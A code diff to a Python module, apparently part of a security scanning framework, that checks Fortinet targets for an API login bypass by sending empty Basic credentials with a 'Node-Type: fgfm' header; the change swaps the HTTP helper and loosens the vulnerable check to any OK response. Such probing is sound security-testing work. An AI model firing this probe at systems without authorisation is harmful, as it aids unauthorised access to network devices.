@@ -1,7 +1,6 @@
 import urllib3
 import sys
 import smf
-from lib.smf.ssl.netssl import *
 
 metadata = {
     "Name": "Fortinet scan API login bypass",
@@ -31,11 +30,11 @@ privileges via crafted requests to Node.js websocket module.
         ],
     },
 }
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 REQUIRED_OPTIONS = {"URL": ""}
 
 
-def execute(options):
+def execute(options, net):
     target = options.get("URL")
     port = 443
 
@@ -46,10 +45,11 @@ def execute(options):
         "Node-Type": "fgfm",
         "Authorization": "Basic Og==",
     }
-
+    
+    http = net.HTTPR()
     try:
-        res = storm_ssl("GET", url, headers=headers)
-        if res.status_code == 200 and "version" in res.text.lower():
+        res = http.get(url, headers).run()
+        if res.ok:
             smf.printf(f"{'='*40}")
             smf.printf(f"[!] VULNERABLE: {target}")
             smf.printf(
